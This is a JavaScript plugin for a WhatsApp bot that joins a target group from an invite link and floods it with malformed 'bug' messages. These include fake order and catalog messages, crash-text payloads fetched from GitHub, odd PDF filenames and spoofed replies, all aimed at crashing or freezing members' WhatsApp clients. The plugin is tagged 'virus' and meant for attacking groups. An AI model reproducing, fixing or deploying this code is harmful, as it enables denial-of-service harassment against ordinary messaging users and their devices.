import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'

const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
const isNumber = x => typeof x === 'number' && !isNaN(x)
const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(function () {
    clearTimeout(this)
    resolve()
}, ms))

let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let name = conn.getName(who)
if (!text)throw `Silahkan masukan link group target!\n\nContoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz\n\n*Note :*\nGunaka Fitur Hanya Untuk Ripper Atau Scamer`;
    let [_, code] = text.match(linkRegex) || []
    if (!code) throw `Link salah cok!\ncontoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
      
      
        let target = await conn.groupAcceptInvite(code)
        let namagc = (await conn.groupMetadata(target)).subject || '';
        let tes = 'tess'
        let member = (await conn.groupMetadata(target)).participants.map(v => v.id)
let thumb = fs.readFileSync('./thumbnail.jpg')
let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/virus/main/virtex1.txt")).text()
	let type = (args[0] || '').toLowerCase()

	const from = m.key.remoteJid
	//const participants = m.isGroup ? await groupMetadata.participants : ''
	let q = `Bug Tag From ${author}\n${text}`
	let sections = [{
		title: `Recoded by ${gcname}`,
		rows: [
			{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
			{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
			{ title: 'Bug Sticker', rowId: `${_p + command} sticker ${text}` },
			{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
			{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
			{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
			{ title: 'BugKontak', rowId: `${_p + command} bugkontak ${text}` },
			{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
			{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
			{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
		]
	}]
	let listMessage = {
		text: '*[ List Bug ]*\n\n*Note :* Jangan Gunakan Secara Sembarangan',
		footer: gcname,
		buttonText: 'Silahkan Klik Di Sini',
		sections
	}

	//==================( Quoted ) =================//
	//# Kal
	const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
	"message": {
		"extendedTextMessage": {
			"text": `${gcname}`,
			"previewType": "NONE",
			"contextInfo": {
				"stanzaId": "3EB0382EDBB2",
				"participant": "@s.whatsapp.net"
			}
		}
	}}
	//=================================================//		
	//# Troli
	const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": "",
			"orderTitle": `${gcname}`,
			"sellerJid": "12136852040@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": fsizedoc,
			"totalCurrencyCode": "IDR" 
		}
	}}
	//#Troli 2
	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
	"message": {
		orderMessage: { 		itemCount: fsizedoc,
			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `漏 ${gcname}`,
			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			totalAmount1000: fsizedoc,
			totalCurrencyCode: "IDR",
			orderTitle: `${gcname} ${virus2}`,
			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
		sendEphemeral: true
	}	
	//=================================================//	
	//# Sticker
	const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
			"status": "INQUIRY",
			"surface": "CATALOG",
			"message": `${gcname}`,
			"orderTitle": `${gcname}`,
			"sellerJid": "12136852040@s.whatsapp.net",
			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
			"totalAmount1000": fsizedoc,
			"totalCurrencyCode": "IDR"
		}
	}}
	//=================================================//
	//# Pdf
	const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	message: {
		"imageMessage": { "mimetype": "image/jpeg", "caption": `${gcname}`, "jpegThumbnail": thumb
		}
	}}
	//=================================================//   
	//# Vn
	const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
	"message": {
		"locationMessage": {}
	}} 
	//=================================================//	   
	//# Image
	const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
		"message": {
			"audioMessage": {
				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
				"mimetype": "audio/aac",
				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
				"fileLength": fsizedoc,
				"seconds": fsizedoc,
				"caption": `${gcname}`,
				"ptt": false,
				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
				"mediaKeyTimestamp": "1632753911"
			}
		}
	}
	//=================================================//		
	//# Catalog
	const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		"productMessage": {
		"product": {
			"productImage": messa.imageMessage,
			"productId": "4383282311765462",
			"title": `${gcname}`,
			"description": `${virus2}`,
			"currencyCode": "IDR",
			"bodyText": `${virus}`,
			"footerText": `${gcname}`,
			"priceAmount1000": fsizedoc,
			"productImageCount": 1,
			"firstImageId": 1,
			"salePriceAmount1000": fsizedoc,
			"retailerId": `${gcname}`,
			"url": "wa.me/12136852040"
		},
			"businessOwnerJid": "12136852040@s.whatsapp.net",
		}
	}), { userJid: m.chat, quoted: ftrolii })	
	//=================================================//	
	//# Contact
	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${gcname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${gcname}\nitem1.TEL;waid=12136852040:12136852040\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
	//=================================================//   
	//# Text
	const main = {
		"key": {
			"fromMe": false,
			"participant": "0@s.whatsapp.net",
			...({"remoteJid":''})
			},
		"message":{
			"imageMessage":{
				"mimetype":"image/jpeg",
				"jpegThumbnail":fs.readFileSync('./thumbnail.jpg')
			}
		}
	}
	//=================================================//   

	switch (type) {
		case 'vn': {
			conn.sendMessage(target, {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
			//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'pdf': {
			conn.sendMessage(target, {document: thumb, filename:`馃尀饢Ч蜏蛽汀蜏饾懘汀蜏饾懆汀蜏覊饾懘汀蜏饾懆汀蜏覊饾應汀蜏饾懚汀蜏饢Ч蛽蛽鬆嚍馂.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
			//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'sticker': {
			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.gcname, global.author)
			conn.sendFile(target, stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugimg': {
			conn.sendMessage(target, {image: thumb, bugimage }, {quoted: bugimage})
		}
		break
		case 'bugcrash': {
			conn.fakeReply(target, '🌷', '12136852040@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(target, '🌷', '12136852040@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(target, '🌷', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(target, '🌷', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(target, '🌷', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(target, '🌷', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugkontak': {
			let res = await generateWAMessageFromContent(target, {
				"contactMessage": {
					"vcard": "HAHaAhHAHAHA",
					"displayName": `${author}`,
					"contextInfo": {
						"forwardingScore": 3,
						"isForwarded": true
					}
				}
			}, {quoted: fkontaak, contextInfo:{}}) 
			conn.relayWAMessage(res)
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'reactpc': {
			await conn.sendMessage(target, {text: `${gcname}` }, {quoted: trol})
			//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugtag': {
			if (!m.isGroup) return global.dfail('group',m,conn)
			conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
		}
		break
		case 'bugcatalog': {
			conn.relayMessage(target, catalog.message, { messageId: catalog.key.id })
		}
		break
		case 'bugtextcrash': {
			conn.reply(target, `${gcname}`, main)
		}
		break
		case 'bugvid': {
			conn.sendMessage(target, {video: thumb, bugimage, }, {quoted: bugimage})
		}
		break
		default:
			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
			throw false
conn.reply(m.chat, 'Sedang Menyerang Group...', m)
            await delay(1500)
    await conn.groupLeave(target).catch((e) => {
            console.error(e)
            throw conn.groupLeave(target)
        })
	}
let bcbg = `https://telegra.ph/file/9e69cee6c64a9477b133c.jpg`

       conn.send3ButtonImg(m.chat, bcbg, gcname, `*Sukses Mengirim Ke Group ${gcname}\n\n${botdate}`,
   'Menu','.menu',
     'Owner','.owner',
       'Donasi','.donasi'
       )
}

handler.help = ['listbuggc <link>']
handler.tags = ['virus']
handler.command = /^listbuggc$/i

handler.premium = false
handler.limit = true
handler.owner = true

export default handler